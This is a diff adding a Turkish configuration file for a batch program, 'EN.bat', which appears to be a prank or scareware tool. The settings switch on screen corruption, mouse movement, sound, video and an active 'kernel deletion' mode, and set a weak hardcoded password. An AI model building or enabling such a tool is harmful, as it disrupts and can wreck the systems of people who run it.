@@ -1,0 +1,32 @@
+# EN.bat Yapılandırma Dosyası
+# Her satırda bir ayar bulunur. Satır başındaki # yorum satırıdır.
+
+# Süre (saniye cinsinden) - 0 ise sonsuz
+SURE=1800
+
+# Dil: tr veya en
+DIL=tr
+
+# Sinir eşiği (0-10 arası, 10 = max)
+SINIR_ESIK=10
+
+# Kernel silme modu: 1=aktif, 0=pasif
+KERNEL_SIL=1
+
+# Şifre (boş bırakılırsa şifre sorulmaz)
+SIFRE=123456
+
+# Ekran bozma süresi (saniye)
+EKRAN_BOZMA_SURE=60
+
+# Ses efekti aktif (1) / pasif (0)
+SES_AKTIF=1
+
+# Fare hareketi aktif (1) / pasif (0)
+FARE_AKTIF=1
+
+# Mini oyun aktif (1) / pasif (0)
+OYUN_AKTIF=1
+
+# Video açma aktif (1) / pasif (0)
+VIDEO_AKTIF=1
